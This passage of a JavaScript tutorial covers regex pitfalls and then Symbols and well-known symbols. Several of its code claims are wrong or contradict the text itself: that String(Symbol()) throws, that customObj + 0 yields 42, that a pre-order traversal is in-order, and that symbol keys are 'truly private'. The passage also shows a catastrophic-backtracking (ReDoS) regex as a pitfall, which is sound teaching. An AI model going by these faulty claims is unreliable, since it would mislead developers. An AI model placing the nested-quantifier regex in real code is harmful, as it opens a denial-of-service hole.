// âœ… CORRECT: Escape dots for literal match
const regex = /192\.168\.1\.1/;
console.log(regex.test('192X168Y1Z1'));  // false
console.log(regex.test('192.168.1.1'));  // true
```

### Pitfall 2: Global Flag and lastIndex

```javascript
// âŒ GOTCHA: Global regex remembers position between test() calls
const regex = /a/g;

console.log(regex.test('banana'));  // true (found at index 1)
console.log(regex.lastIndex);       // 2
console.log(regex.test('banana'));  // true (found at index 3)
console.log(regex.test('banana'));  // true (found at index 5)
console.log(regex.test('banana'));  // false (no more matches)
console.log(regex.test('banana'));  // true (reset, found at 1 again)

// âœ… SOLUTION: Reset lastIndex or don't use global for test()
regex.lastIndex = 0;  // Manual reset

// Or use non-global for simple testing
const simpleRegex = /a/;  // No 'g' flag
console.log(simpleRegex.test('banana'));  // Always starts fresh
```

### Pitfall 3: Greedy vs Lazy Matching

```javascript
// âŒ GOTCHA: Default is greedy (matches as much as possible)
const html = '<div>Hello</div><div>World</div>';
const greedy = /<div>.*<\/div>/;
console.log(html.match(greedy)[0]);
// '<div>Hello</div><div>World</div>' â€” matched TOO much!

// âœ… CORRECT: Use lazy quantifier (?)
const lazy = /<div>.*?<\/div>/;
console.log(html.match(lazy)[0]);
// '<div>Hello</div>' â€” matches minimum
```

### Pitfall 4: Backtracking Performance

```javascript
// âŒ DANGER: Catastrophic backtracking (ReDoS vulnerability)
const evilRegex = /^(a+)+$/;

// This takes EXPONENTIAL time on near-matches:
console.time('evil');
evilRegex.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaa!');  // Hangs!
console.timeEnd('evil');

// âœ… SOLUTION: Use possessive quantifiers or atomic groups
// Or rewrite to avoid nested quantifiers
const safeRegex = /^a+$/;  // Simple, no backtracking
```

### Pitfall 5: Unicode Without the u Flag

```javascript
// âŒ WRONG: Without 'u', regex sees UTF-16 code units
const emoji = 'ðŸ˜€';
console.log(/^.$/.test(emoji));   // false! ðŸ˜€ is 2 code units
console.log(emoji.length);        // 2

// âœ… CORRECT: Use 'u' flag for Unicode
console.log(/^.$/u.test(emoji));  // true
console.log(/\p{Emoji}/u.test(emoji));  // true (Unicode property)
```

### Pitfall 6: ^ and $ in Multiline

```javascript
// âŒ GOTCHA: Without 'm', ^ and $ match string start/end only
const text = 'line1\nline2\nline3';
console.log(text.match(/^\w+/g));  // ['line1'] â€” only first line

// âœ… CORRECT: Use 'm' flag for line-by-line matching
console.log(text.match(/^\w+/gm));  // ['line1', 'line2', 'line3']
```

---

## 9.5 RegExp Summary

| Flag | Meaning |
|------|---------|
| `g` | Global (all matches) |
| `i` | Case-insensitive |
| `m` | Multiline |
| `s` | Dotall (`.` matches newlines) |
| `u` | Unicode |
| `v` | Unicode sets (ES2024) |
| `d` | Indices |

---

**End of Chapter 9: Regular Expressions**


# 10-Symbols.md

# 10 Symbols

Symbols are unique, immutable primitive values used as property keys. Well-known symbols customize object behavior.

---

## 10.1 Symbol Basics

**Symbols** are a primitive data type representing unique, immutable identifiers. They enable creating truly private object properties and special behavioral hooks.

---

### 10.1.1 Creating Symbols

**Symbols are created with the `Symbol()` function.** Each call creates a unique symbol.

```javascript
// Creating symbols
let sym1 = Symbol();
let sym2 = Symbol();

// Every symbol is unique
sym1 === sym2;                   // false
sym1 == sym2;                    // false

// Different from any other value
sym1 === Symbol();               // false (new symbol each time)

// Type checking
typeof Symbol();                 // 'symbol'
typeof sym1;                     // 'symbol'

// Cannot use new keyword
new Symbol();                    // TypeError: Symbol is not a constructor

// Symbols are immutable
const sym = Symbol();
sym.value = 'test';              // Allowed but useless (assigned to undefined)
sym;                             // Symbol() (unchanged)

// Cannot be coerced to other types
String(Symbol());                // TypeError: Cannot convert symbol to string
Number(Symbol());                // TypeError: Cannot convert symbol to number
Boolean(Symbol());               // true (only falsy values are false/0/''/null/undefined/NaN)

// Can convert to string explicitly with String()
let mySym = Symbol('description');
String(mySym);                   // 'Symbol(description)'

// Symbol.toString() works
mySym.toString();                // 'Symbol(description)'

// Cannot use in template literals without explicit conversion
`Symbol: ${String(mySym)}`;      // 'Symbol: Symbol(description)'
```

---

### 10.1.2 Symbol Description

**The optional description parameter** helps identify symbols during debugging.

```javascript
// With description
let user = Symbol('user');
let admin = Symbol('admin');

user.description;                // 'user'
admin.description;               // 'admin'

// Description doesn't affect uniqueness
Symbol('test') === Symbol('test');  // false (still unique)

// No description
let noDesc = Symbol();
noDesc.description;              // undefined

// Descriptions in output
user.toString();                 // 'Symbol(user)'
admin.toString();                // 'Symbol(admin)'

// Real-world use: object property keys
let permissions = {
  [user]: 'can read',
  [admin]: 'can modify',
  regular: 'can view'
};

// Symbol keys are hidden from normal enumeration
Object.keys(permissions);        // ['regular']
Object.getOwnPropertyNames(permissions);  // ['regular']
Object.getOwnPropertySymbols(permissions);  // [Symbol(user), Symbol(admin)]

// Accessing via symbols
permissions[user];               // 'can read'
permissions[admin];              // 'can modify'

// Descriptive symbols for clarity
const PRIVATE_DATA = Symbol('private data');
const HIDDEN_ID = Symbol('hidden id');

class User {
  constructor(name) {
    this.name = name;
    this[PRIVATE_DATA] = Math.random();
    this[HIDDEN_ID] = Date.now();
  }

  getPrivateData() {
    return this[PRIVATE_DATA];
  }
}

let user1 = new User('Alice');
user1.name;                      // 'Alice'
user1[PRIVATE_DATA];             // 0.123... (only accessible internally)

// Outside access to private data impossible without symbol reference
user1[Symbol('private data')];   // undefined (different symbol)

// Symbol description useful for debugging
console.log(PRIVATE_DATA);       // Symbol(private data)
console.log(HIDDEN_ID);          // Symbol(hidden id)
```

---

### 10.1.3 Global Symbol Registry

**`Symbol.for()` and `Symbol.keyFor()`** manage a global registry of symbols.

```javascript
// Symbol.for() - get or create global symbol
let globalSym1 = Symbol.for('app.id');
let globalSym2 = Symbol.for('app.id');

globalSym1 === globalSym2;       // true (same global symbol!)

// Different from Symbol()
let localSym = Symbol('app.id');
globalSym1 === localSym;         // false (different registries)

// Symbol.keyFor() - get key from global symbol
Symbol.keyFor(globalSym1);       // 'app.id'

// Works only with global symbols
Symbol.keyFor(localSym);         // undefined (not in global registry)

// Real-world: shared library symbols
const APP_ID = Symbol.for('myapp.id');
const SESSION_ID = Symbol.for('myapp.session');

// In different modules, access same symbols
// Module A
let obj = {
  [APP_ID]: 'app-123',
  [SESSION_ID]: 'sess-456'
};

// Module B (different file)
let appId = Symbol.for('myapp.id');
let sessionId = Symbol.for('myapp.session');

obj[appId];                      // 'app-123' (works - same global symbol)
obj[sessionId];                  // 'sess-456'

// Global registry persists across realms (frames, workers, etc.)
// In frame 1
window[Symbol.for('shared')] = 'data';

// In frame 2 (different browsing context)
Symbol.keyFor(Symbol.for('shared'));  // 'shared' (accessible)

// Namespace pattern with global symbols
const CONFIG = Symbol.for('config.settings');
const CACHE = Symbol.for('config.cache');
const LIMITS = Symbol.for('config.limits');

let config = {
  [CONFIG]: { theme: 'dark', lang: 'en' },
  [CACHE]: new Map(),
  [LIMITS]: { timeout: 5000 }
};

// Get all global symbols
function getAllGlobalSymbols() {
  let result = [];
  // No built-in way, must track manually
  return result;
}

// Local vs global distinction
const LOCAL = Symbol('local');
const GLOBAL = Symbol.for('global');

LOCAL.description;               // 'local'
GLOBAL.description;              // 'global'

Symbol.keyFor(LOCAL);             // undefined
Symbol.keyFor(GLOBAL);            // 'global'

// Practical: shared data between libraries
// Library A: creates config storage
const DATA_KEY = Symbol.for('__shared_data__');
window[DATA_KEY] = { users: new Map() };

// Library B: accesses same storage
const SHARED = Symbol.for('__shared_data__');
SHARED === DATA_KEY;             // true
window[SHARED].users.set('alice', { id: 1 });

// Multiple global symbol namespaces
const EXTERNAL_API = Symbol.for('api.external');
const INTERNAL_API = Symbol.for('api.internal');

let service = {
  [EXTERNAL_API]: { getUser: () => {} },
  [INTERNAL_API]: { validate: () => {} }
};

let external = Symbol.for('api.external');
service[external].getUser();     // works
```

---

### 10.1.4 Symbols as Property Keys

**Symbols work as object property keys**, enabling private properties.

```javascript
// Using symbols as keys
let sym1 = Symbol('key1');
let sym2 = Symbol('key2');

let obj = {
  [sym1]: 'value1',
  [sym2]: 'value2',
  regular: 'public'
};

// Accessing properties
obj[sym1];                       // 'value1'
obj[sym2];                       // 'value2'
obj.regular;                     // 'public'

// Symbols don't appear in for...in loop
for (let key in obj) {
  console.log(key);              // Only 'regular'
}

// Object.keys() doesn't include symbols
Object.keys(obj);                // ['regular']

// Object.getOwnPropertyNames() doesn't include symbols
Object.getOwnPropertyNames(obj); // ['regular']

// Object.getOwnPropertySymbols() gets symbol keys only
Object.getOwnPropertySymbols(obj);  // [Symbol(key1), Symbol(key2)]

// Get all properties (both types)
function getAllProperties(obj) {
  return [
    ...Object.keys(obj),
    ...Object.getOwnPropertySymbols(obj)
  ];
}

getAllProperties(obj);           // ['regular', Symbol(key1), Symbol(key2)]

// Real-world: truly private properties
class BankAccount {
  constructor(balance) {
    this.accountNumber = '12345';
    this[BALANCE] = balance;  // Private
  }

  withdraw(amount) {
    if (this[BALANCE] >= amount) {
      this[BALANCE] -= amount;
      return true;
    }
    return false;
  }

  getBalance() {
    return this[BALANCE];     // Only via method
  }
}

const BALANCE = Symbol('balance');
let account = new BankAccount(1000);

account.accountNumber;           // '12345' (public)
account[BALANCE];                // 1000 (private, if you have the symbol)
account.getBalance();            // 1000 (through method)

// Outside code can't access without symbol
account.balance;                 // undefined
account.BALANCE;                 // undefined

// Combining symbols and regular properties
let settings = {
  theme: 'dark',                 // Public
  language: 'en',                // Public
  [Symbol('password')]: 'secret', // Private
  [Symbol('salt')]: 'abc123'     // Private
};

// Public API
Object.keys(settings);           // ['theme', 'language']

// Private accessible only internally
Object.getOwnPropertySymbols(settings);  // [Symbol(password), Symbol(salt)]

// Real-world: plugin system with private state
const STATE = Symbol('state');
const CONFIG = Symbol('config');

class Plugin {
  constructor(name) {
    this.name = name;
    this[STATE] = { enabled: false };
    this[CONFIG] = {};
  }

  enable() {
    this[STATE].enabled = true;
  }

  isEnabled() {
    return this[STATE].enabled;
  }
}

let plugin = new Plugin('Auth');
Object.keys(plugin);             // ['name'] - internal state hidden

// Comparing approaches
// Bad: underscore convention (not truly private)
class BadPrivacy {
  constructor() {
    this._private = 'hidden';     // Not actually private
  }
}

let bad = new BadPrivacy();
bad._private;                    // 'hidden' - accessible!

// Good: symbol-based (truly private)
class GoodPrivacy {
  constructor() {
    this[PRIVATE_KEY] = 'hidden'; // Only accessible with symbol
  }
}

const PRIVATE_KEY = Symbol('private');
let good = new GoodPrivacy();
good[PRIVATE_KEY];               // 'hidden' - need symbol to access
good.PRIVATE_KEY;                // undefined - can't access with property name

// Iteration over all properties preserves symbols
let full = {
  name: 'Alice',
  [Symbol('id')]: 123
};

// Using Object.getOwnPropertyDescriptors()
let descriptors = Object.getOwnPropertyDescriptors(full);
Object.keys(descriptors);        // ['name', Symbol(id)]

// Copying objects with symbols
function copyWithSymbols(obj) {
  let copy = {};
  [...Object.keys(obj), ...Object.getOwnPropertySymbols(obj)].forEach(key => {
    copy[key] = obj[key];
  });
  return copy;
}

let original = { name: 'Bob', [Symbol('id')]: 456 };
let copied = copyWithSymbols(original);
Object.getOwnPropertySymbols(copied).length; // 1 (symbol copied too)
```

---

### 10.1.5 Symbol Uniqueness and Identity

**Symbols are always unique**, making them perfect for identity-based operations.

```javascript
// Uniqueness guaranteed
let s1 = Symbol('test');
let s2 = Symbol('test');
s1 === s2;                       // false (even same description)

// Except for global symbols
let g1 = Symbol.for('global');
let g2 = Symbol.for('global');
g1 === g2;                       // true (same global symbol)

// Useful for switch statements
const PENDING = Symbol('pending');
const SUCCESS = Symbol('success');
const ERROR = Symbol('error');

function handleState(state) {
  switch(state) {
    case PENDING:
      return 'Loading...';
    case SUCCESS:
      return 'Done!';
    case ERROR:
      return 'Error!';
    default:
      return 'Unknown';
  }
}

handleState(PENDING);            // 'Loading...'

// Better than strings
const BAD_PENDING = 'pending';
const BAD_SUCCESS = 'success';

// Typos aren't caught with strings
handleState('PENDING');          // 'Unknown' (typo not caught)
handleState(PENDING);            // 'Loading...' (type safe)

// Unique identifiers for objects
let users = new Map();
let user1 = { name: 'Alice' };
let user2 = { name: 'Bob' };

let id1 = Symbol('user-1');
let id2 = Symbol('user-2');

users.set(id1, user1);
users.set(id2, user2);

users.get(id1);                  // { name: 'Alice' }
users.get(id2);                  // { name: 'Bob' }

// Can't accidentally overwrite
users.set(Symbol('user-1'), { name: 'Eve' });  // New symbol
users.get(id1);                  // Still { name: 'Alice' }

// Real-world: event emitter with internal events
const INTERNAL_INIT = Symbol('init');
const INTERNAL_CLEANUP = Symbol('cleanup');

class EventEmitter {
  constructor() {
    this.listeners = {};
    this[INTERNAL_INIT]();
  }

  on(event, handler) {
    if (!this.listeners[event]) {
      this.listeners[event] = [];
    }
    this.listeners[event].push(handler);
  }

  emit(event, data) {
    if (this.listeners[event]) {
      this.listeners[event].forEach(h => h(data));
    }
  }

  destroy() {
    this[INTERNAL_CLEANUP]();
  }

  [INTERNAL_INIT]() {
    // Setup only accessible internally
  }

  [INTERNAL_CLEANUP]() {
    // Cleanup only accessible internally
  }
}

// User can only use public API
let emitter = new EventEmitter();
emitter.on('message', (data) => console.log(data));
// Can't access emitter[INTERNAL_INIT] or emitter[INTERNAL_CLEANUP]

// Weak references with symbols
let weakMap = new WeakMap();
let obj = {};
let sym = Symbol('ref');

weakMap.set(obj, sym);           // Using symbol as value is OK
weakMap.get(obj) === sym;        // true

// Real-world: multiple interfaces on one object
const RENDERER = Symbol('renderer');
const VALIDATOR = Symbol('validator');
const FORMATTER = Symbol('formatter');

class DataProcessor {
  constructor() {
    this[RENDERER] = { render: () => {} };
    this[VALIDATOR] = { validate: () => {} };
    this[FORMATTER] = { format: () => {} };
  }

  // Public API only shows what's needed
  process(data) {
    // Uses internal interfaces
    if (!this[VALIDATOR].validate(data)) return;
    data = this[FORMATTER].format(data);
    return this[RENDERER].render(data);
  }
}

// Consumer doesn't know about internal interfaces
let processor = new DataProcessor();
processor.process(data);         // Works through public method
processor[RENDERER];             // undefined - needs symbol
```

---

## Summary: Symbol Basics

**Key Takeaways:**

1. **Symbols are primitive unique values** created with `Symbol()`
2. **Each symbol is unique** - `Symbol('x') !== Symbol('x')`
3. **Descriptions help debugging** but don't affect identity
4. **Global registry** via `Symbol.for(key)` for shared symbols
5. **Symbol properties are hidden** from `Object.keys()` and `for...in` loops
6. **Perfect for private properties** - truly inaccessible without symbol reference
7. **Symbol.keyFor()** retrieves key from global symbols only

**Common Use Cases:**
- Private object properties
- Hidden internal methods
- Unique event types
- Internal state storage
- Library-shared data via global registry
- Plugin systems with private state

**Key Methods:**
- `Symbol(description)` - Create unique symbol
- `Symbol.for(key)` - Get/create global symbol
- `Symbol.keyFor(symbol)` - Get key if global
- `Object.getOwnPropertySymbols()` - Get symbol keys
- `.description` - Get symbol description

**Best Practices:**
- Use symbols for truly private properties
- Use descriptive descriptions for debugging
- Use `Symbol.for()` for cross-module communication
- Consider symbols over underscore convention
- Document which symbols are private vs public
- Use global symbols carefully to avoid conflicts
## 10.2 Well-known Symbols

**Well-known symbols** are built-in symbols that customize how objects interact with language features and built-in operations. They enable protocol implementation.

---

### 10.2.1 Symbol.iterator

**Symbol.iterator** enables objects to work with `for...of` loops and spread operator.

```javascript
// Make object iterable
let iterable = {
  data: [1, 2, 3],
  
  [Symbol.iterator]() {
    let index = 0;
    let data = this.data;
    
    return {
      next: () => {
        if (index < data.length) {
          return { value: data[index++], done: false };
        }
        return { done: true };
      }
    };
  }
};

// Now works with for...of
for (let value of iterable) {
  console.log(value);            // 1, 2, 3
}

// Works with spread operator
[...iterable];                   // [1, 2, 3]

// Works with destructuring
let [first, ...rest] = iterable;
first;                           // 1
rest;                            // [2, 3]

// Check if object is iterable
typeof iterable[Symbol.iterator] === 'function';  // true

// Real-world: custom range iterator
class Range {
  constructor(start, end) {
    this.start = start;
    this.end = end;
  }

  [Symbol.iterator]() {
    let current = this.start;
    let end = this.end;
    
    return {
      next: () => {
        if (current <= end) {
          return { value: current++, done: false };
        }
        return { done: true };
      }
    };
  }
}

let range = new Range(1, 5);
[...range];                      // [1, 2, 3, 4, 5]

for (let n of range) {
  console.log(n);                // 1, 2, 3, 4, 5
}

// Custom collection with Symbol.iterator
class LinkedList {
  constructor() {
    this.head = null;
  }

  append(value) {
    if (!this.head) {
      this.head = { value, next: null };
    } else {
      let current = this.head;
      while (current.next) current = current.next;
      current.next = { value, next: null };
    }
  }

  [Symbol.iterator]() {
    let current = this.head;
    
    return {
      next: () => {
        if (current) {
          let value = current.value;
          current = current.next;
          return { value, done: false };
        }
        return { done: true };
      }
    };
  }
}

let list = new LinkedList();
list.append(10);
list.append(20);
list.append(30);

for (let val of list) {
  console.log(val);              // 10, 20, 30
}

// Generator functions create iterators automatically
function* countdown(n) {
  while (n > 0) {
    yield n--;
  }
}

[...countdown(3)];               // [3, 2, 1]

for (let n of countdown(5)) {
  console.log(n);                // 5, 4, 3, 2, 1
}

// Symbol.iterator with generator
class Tree {
  constructor(value, left = null, right = null) {
    this.value = value;
    this.left = left;
    this.right = right;
  }

  *[Symbol.iterator]() {
    yield this.value;
    if (this.left) yield* this.left;
    if (this.right) yield* this.right;
  }
}

let tree = new Tree(1,
  new Tree(2, new Tree(4), new Tree(5)),
  new Tree(3, new Tree(6), new Tree(7))
);

[...tree];                       // [1, 2, 4, 5, 3, 6, 7] (in-order traversal)

// Built-in iterables
[...'hello'];                    // ['h', 'e', 'l', 'l', 'o'] (String iterable)
[...new Set([1, 2, 3])];         // [1, 2, 3] (Set iterable)
[...new Map([['a', 1]])];        // [['a', 1]] (Map iterable)
```

---

### 10.2.2 Symbol.asyncIterator

**Symbol.asyncIterator** enables async iteration with `for await...of` loops.

```javascript
// Async iterable
let asyncIterable = {
  data: ['a', 'b', 'c'],
  
  [Symbol.asyncIterator]() {
    let index = 0;
    let data = this.data;
    
    return {
      next: async () => {
        // Simulate async operation
        await new Promise(r => setTimeout(r, 100));
        
        if (index < data.length) {
          return { value: data[index++], done: false };
        }
        return { done: true };
      }
    };
  }
};

// Use with for await...of
async function iterate() {
  for await (let value of asyncIterable) {
    console.log(value);          // 'a', 'b', 'c' (with 100ms delays)
  }
}

iterate();

// Async generator (shorthand)
async function* asyncCounter(n) {
  for (let i = 0; i < n; i++) {
    await new Promise(r => setTimeout(r, 100));
    yield i;
  }
}

// Use async generator
async function count() {
  for await (let n of asyncCounter(3)) {
    console.log(n);              // 0, 1, 2
  }
}

// Real-world: async data fetching
class AsyncDataFetcher {
  constructor(urls) {
    this.urls = urls;
  }

  [Symbol.asyncIterator]() {
    let index = 0;
    let urls = this.urls;
    
    return {
      next: async () => {
        if (index < urls.length) {
          let url = urls[index++];
          let response = await fetch(url);
          let data = await response.json();
          return { value: data, done: false };
        }
        return { done: true };
      }
    };
  }
}

// Usage
async function fetchAll() {
  let fetcher = new AsyncDataFetcher([
    '/api/users',
    '/api/posts',
    '/api/comments'
  ]);

  for await (let data of fetcher) {
    console.log(data);            // Each API response
  }
}

// Combining async with sync iterables
async function* asyncMap(iterable, fn) {
  for (let item of iterable) {
    yield await fn(item);
  }
}

let numbers = [1, 2, 3];
async function double(n) {
  return n * 2;
}

for await (let n of asyncMap(numbers, double)) {
  console.log(n);                // 2, 4, 6
}

// Real-world: database cursor
class DatabaseCursor {
  constructor(query, pageSize = 10) {
    this.query = query;
    this.pageSize = pageSize;
    this.page = 0;
  }

  [Symbol.asyncIterator]() {
    return this;
  }

  async next() {
    // Simulate database fetch
    let results = await this.fetchPage(this.page);
    
    if (results.length === 0) {
      return { done: true };
    }
    
    this.page++;
    return { value: results, done: false };
  }

  async fetchPage(pageNum) {
    // Simulate async database call
    await new Promise(r => setTimeout(r, 50));
    return this.query.slice(
      pageNum * this.pageSize,
      (pageNum + 1) * this.pageSize
    );
  }
}

// Usage
async function queryDatabase() {
  let cursor = new DatabaseCursor([1, 2, 3, 4, 5, 6, 7], 2);
  
  for await (let page of cursor) {
    console.log(page);            // [1, 2], [3, 4], [5, 6], [7]
  }
}
```

---

### 10.2.3 Symbol.toStringTag

**Symbol.toStringTag** customizes the output of `Object.prototype.toString()`.

```javascript
// Default toString
let obj = {};
Object.prototype.toString.call(obj);  // '[object Object]'

let arr = [];
Object.prototype.toString.call(arr);  // '[object Array]'

// Custom toStringTag
class MyClass {
  get [Symbol.toStringTag]() {
    return 'MyClass';
  }
}

let instance = new MyClass();
Object.prototype.toString.call(instance);  // '[object MyClass]'

// Built-in classes have toStringTag
Object.prototype.toString.call(new Map());      // '[object Map]'
Object.prototype.toString.call(new Set());      // '[object Set]'
Object.prototype.toString.call(new Promise(() => {}));  // '[object Promise]'
Object.prototype.toString.call(new Date());     // '[object Date]'

// Real-world: custom error classes
class ValidationError {
  constructor(message) {
    this.message = message;
  }

  get [Symbol.toStringTag]() {
    return 'ValidationError';
  }
}

let error = new ValidationError('Invalid input');
String(error);                   // Using toString indirectly
Object.prototype.toString.call(error);  // '[object ValidationError]'

// Type checking
function isError(obj) {
  let tag = Object.prototype.toString.call(obj);
  return tag === '[object Error]' ||
         tag === '[object ValidationError]' ||
         tag === '[object TypeError]';
}

// Real-world: custom collection
class Stack {
  constructor() {
    this.items = [];
  }

  push(value) {
    this.items.push(value);
  }

  pop() {
    return this.items.pop();
  }

  get [Symbol.toStringTag]() {
    return 'Stack';
  }

  toString() {
    return `Stack(${this.items.length})`;
  }
}

let stack = new Stack();
stack.push(1);
stack.push(2);

Object.prototype.toString.call(stack);  // '[object Stack]'
String(stack);                   // 'Stack(2)'

// Useful for logging
console.log(`Processing: ${Object.prototype.toString.call(obj)}`);

// Factory pattern with type checking
function createParser(type) {
  class Parser {
    get [Symbol.toStringTag]() {
      return `${type}Parser`;
    }
  }
  return new Parser();
}

let jsonParser = createParser('JSON');
Object.prototype.toString.call(jsonParser);  // '[object JSONParser]'
```

---

### 10.2.4 Symbol.toPrimitive

**Symbol.toPrimitive** defines how objects convert to primitives in coercion.

```javascript
// Default behavior
let obj = {};
obj + 1;                         // '[object Object]1' (converts to string)
Number(obj);                     // NaN
Boolean(obj);                    // true

// Custom toPrimitive
let customObj = {
  [Symbol.toPrimitive](hint) {
    // hint: 'string', 'number', or 'default'
    switch(hint) {
      case 'number':
        return 42;
      case 'string':
        return 'MyObject';
      case 'default':
        return 'DEFAULT';
    }
  }
};

Number(customObj);               // 42
String(customObj);               // 'MyObject'
customObj + 0;                   // 42 (hint: 'default', but treated as number)
customObj + '';                  // 'DEFAULT' (hint: 'default')

// Real-world: custom numeric type
class Currency {
  constructor(amount, code = 'USD') {
    this.amount = amount;
    this.code = code;
  }

  [Symbol.toPrimitive](hint) {
    switch(hint) {
      case 'number':
        return this.amount;
      case 'string':
        return `${this.amount} ${this.code}`;
      case 'default':
        return this.amount;
    }
  }
}

let usd = new Currency(100, 'USD');

// Numeric operations
usd + 50;                        // 150
usd * 2;                         // 200

// String operations
String(usd);                     // '100 USD'
`Total: ${usd}`;                 // 'Total: 100 USD'

// Comparison
usd == 100;                      // true
usd < 200;                       // true

// Real-world: version comparison
class Version {
  constructor(major, minor, patch) {
    this.major = major;
    this.minor = minor;
    this.patch = patch;
  }

  [Symbol.toPrimitive](hint) {
    if (hint === 'string') {
      return `${this.major}.${this.minor}.${this.patch}`;
    }
    // Numeric: convert to single number for comparison
    return this.major * 10000 + this.minor * 100 + this.patch;
  }
}

let v1 = new Version(1, 2, 3);
let v2 = new Version(1, 3, 0);

String(v1);                      // '1.2.3'
v2 > v1;                         // true (1300 > 1203)

// Real-world: date comparison
class SmartDate {
  constructor(date) {
    this.date = new Date(date);
  }

  [Symbol.toPrimitive](hint) {
    switch(hint) {
      case 'number':
        return this.date.getTime();
      case 'string':
        return this.date.toISOString();
      case 'default':
        return this.date.getTime();
    }
  }
}

let d1 = new SmartDate('2024-01-01');
let d2 = new SmartDate('2024-12-31');

String(d1);                      // '2024-01-01T00:00:00.000Z'
d2 > d1;                         // true
d1 + 100000;                     // timestamp + 100000 ms

// Conditional behavior
class Flexible {
  constructor(value) {
    this.value = value;
  }

  [Symbol.toPrimitive](hint) {
    console.log(`Converting with hint: ${hint}`);
    if (hint === 'string') return String(this.value);
    if (hint === 'number') return Number(this.value);
    return this.value;
  }
}

let flex = new Flexible(42);
flex + 0;                        // Log: 'Converting with hint: default' -> 42
```

---

### 10.2.5 Symbol.hasInstance

**Symbol.hasInstance** customizes the `instanceof` operator.

```javascript
// Default instanceof
class Animal {}
let dog = new Animal();
dog instanceof Animal;           // true

// Custom hasInstance
class CustomClass {
  static [Symbol.hasInstance](obj) {
    return obj && typeof obj === 'object' && 'customProp' in obj;
  }
}

let obj1 = { customProp: true };
let obj2 = { other: true };

obj1 instanceof CustomClass;     // true
obj2 instanceof CustomClass;     // false

// Real-world: check for duck-typing
class Drawable {
  static [Symbol.hasInstance](obj) {
    return typeof obj.draw === 'function';
  }
}

let canvas = { draw: () => {} };
let notCanvas = {};

canvas instanceof Drawable;      // true
notCanvas instanceof Drawable;   // false

// Real-world: multiple interface support
class Serializable {
  static [Symbol.hasInstance](obj) {
    return typeof obj.toJSON === 'function' &&
           typeof obj.fromJSON === 'function';
  }
}

class User {
  toJSON() { return JSON.stringify(this); }
  fromJSON(str) { return JSON.parse(str); }
}

let user = new User();
user instanceof Serializable;    // true

// Type checking with custom logic
class Number {
  static [Symbol.hasInstance](obj) {
    return typeof obj === 'number' || obj instanceof global.Number;
  }
}

let num = 42;
let numObj = new Number(42);

num instanceof Number;           // true (custom)
numObj instanceof Number;        // true

// Practical: polymorphism checking
class Shape {
  static [Symbol.hasInstance](obj) {
    return obj && typeof obj.area === 'function' &&
           typeof obj.perimeter === 'function';
  }
}

class Circle {
  constructor(radius) {
    this.radius = radius;
  }

  area() {
    return Math.PI * this.radius ** 2;
  }

  perimeter() {
    return 2 * Math.PI * this.radius;
  }
}

let circle = new Circle(5);
circle instanceof Shape;         // true

// Validation with hasInstance
function validate(value, type) {
  return value instanceof type;
}

validate(canvas, Drawable);      // true
validate(user, Serializable);    // true
```

---

### 10.2.6 Symbol.species

**Symbol.species** controls which constructor is used for derived objects.

```javascript
// Array subclass creates Array instances
class MyArray extends Array {
  static get [Symbol.species]() {
    return Array;  // Use Array constructor
  }
}

let arr = new MyArray(1, 2, 3);
let mapped = arr.map(x => x * 2);

mapped instanceof MyArray;       // false
mapped instanceof Array;         // true

// Custom species
class CustomArray extends Array {
  static get [Symbol.species]() {
    return this;  // Use CustomArray constructor
  }
}

let custom = new CustomArray(1, 2, 3);
let customMapped = custom.map(x => x * 2);

customMapped instanceof CustomArray;  // true

// Real-world: specialized collection
class NumberArray extends Array {
  static get [Symbol.species]() {
    return Array;  // Results are regular arrays
  }

  sum() {
    return this.reduce((a, b) => a + b, 0);
  }

  average() {
    return this.sum() / this.length;
  }
}

let nums = new NumberArray(1, 2, 3);
nums.sum();                      // 6
nums.average();                  // 2

let filtered = nums.filter(x => x > 1);
filtered instanceof NumberArray; // false
filtered.sum();                  // 5 (Array doesn't have sum method)

// Real-world: custom Promise
class MyPromise extends Promise {
  static get [Symbol.species]() {
    return Promise;  // then() returns regular Promise
  }

  delay(ms) {
    return this.then(val => 
      new Promise(r => setTimeout(() => r(val), ms))
    );
  }
}

let p = MyPromise.resolve(42);
let delayed = p.delay(1000);

delayed instanceof MyPromise;    // false
delayed instanceof Promise;      // true

// Controlling derived object type
class TrackedArray extends Array {
  static get [Symbol.species]() {
    return this;  // Keep track of derived types
  }

  static create(items) {
    return new this(items);
  }
}

let tracked = new TrackedArray(1, 2, 3);
let sliced = tracked.slice(1);

sliced instanceof TrackedArray;  // true

// Performance optimization with species
class LazyArray extends Array {
  static get [Symbol.species]() {
    return Array;  // Return plain array (faster)
  }

  lazy() {
    // Custom lazy evaluation
  }
}

let lazy = new LazyArray(1, 2, 3);
let result = lazy.map(x => x * 2);  // Returns Array for performance

// Real-world: collection reducer
class Collection extends Array {
  static get [Symbol.species]() {
    return Array;
  }

  unique() {
    return [...new Set(this)];
  }

  groupBy(fn) {
    return this.reduce((acc, item) => {
      let key = fn(item);
      (acc[key] = acc[key] || []).push(item);
      return acc;
    }, {});
  }
}

let coll = new Collection(1, 2, 2, 3, 3, 3);
let unique = coll.map(x => x);  // Returns Array
```

---

### 10.2.7 String Pattern Symbols

**Symbol.match, Symbol.replace, Symbol.search, Symbol.split** customize regex behavior with strings.

```javascript
// Custom string matching
class CustomPattern {
  [Symbol.match](str) {
    // Return match result
    return [str.toUpperCase()];
  }
}

'hello'.match(new CustomPattern());  // ['HELLO']

// Symbol.replace
class Replacer {
  [Symbol.replace](str, replacement) {
    return str.split('').reverse().join('');
  }
}

'hello'.replace(new Replacer(), '');  // 'olleh'

// Symbol.search
class Searcher {
  [Symbol.search](str) {
    return str.indexOf('world');
  }
}

'hello world'.search(new Searcher());  // 6

// Symbol.split
class Splitter {
  [Symbol.split](str) {
    return str.split('');
  }
}

'hello'.split(new Splitter());   // ['h', 'e', 'l', 'l', 'o']

// Real-world: case-insensitive pattern
class CaseInsensitivePattern {
  constructor(text) {
    this.text = text.toLowerCase();
  }

  [Symbol.match](str) {
    let lowerStr = str.toLowerCase();
    let index = lowerStr.indexOf(this.text);
    if (index > -1) {
      return [str.substr(index, this.text.length)];
    }
    return null;
  }

  [Symbol.search](str) {
    return str.toLowerCase().indexOf(this.text);
  }

  [Symbol.replace](str, replacement) {
    let lowerStr = str.toLowerCase();
    let index = lowerStr.indexOf(this.text);
    if (index > -1) {
      return str.substr(0, index) + 
             replacement + 
             str.substr(index + this.text.length);
    }
    return str;
  }
}

let pattern = new CaseInsensitivePattern('hello');
'Hello World'.match(pattern);    // ['Hello']
'Hello World'.search(pattern);   // 0
